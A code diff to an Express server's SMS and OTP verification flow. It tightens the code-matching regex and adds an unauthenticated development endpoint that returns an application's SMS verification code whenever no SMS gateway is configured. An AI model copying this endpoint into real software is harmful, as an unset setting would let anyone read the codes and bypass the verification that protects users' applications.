@@ -119,7 +119,7 @@ app.post('/api/verify-sms', async (req, res) => {
   const app = applications[applicationId];
   if (!app) return res.status(404).json({ success: false, message: 'Application not found' });
 
-  const extracted = (smsMessage.match(/\d{6}/) || [])[0];
+  const extracted = (smsMessage.match(/\b\d{6}\b/) || [])[0];  // stricter: word boundary
   if (!extracted || extracted !== app.smsCode) {
     return res.json({ success: false, message: 'SMS code does not match. Please try again.' });
   }
@@ -134,14 +134,24 @@ app.post('/api/verify-sms', async (req, res) => {
   res.json({ success: true });
 });
 
-// ✅ NEW: CHECK SMS STATUS (dedicated for SMS stage)
+// CHECK SMS STATUS
 app.get('/api/check-sms-status/:applicationId', (req, res) => {
   const app = applications[req.params.applicationId];
   if (!app) return res.status(404).json({ success: false, message: 'Application not found' });
   res.json({ success: true, status: app.smsStatus });
 });
 
-// CHECK OTP STATUS (used for OTP stage)
+// ✅ NEW: DEV SMS CODE (only when gateway not set)
+app.get('/api/dev-sms-code/:applicationId', (req, res) => {
+  const app = applications[req.params.applicationId];
+  if (!app) return res.status(404).json({ success: false, message: 'Application not found' });
+  if (!SMS_GATEWAY_URL) {
+    return res.json({ success: true, code: app.smsCode, simulated: true });
+  }
+  res.json({ success: false, simulated: false });
+});
+
+// CHECK OTP STATUS
 app.get('/api/check-otp-status/:applicationId', (req, res) => {
   const app = applications[req.params.applicationId];
   if (!app) return res.status(404).json({ success: false, message: 'Application not found' });
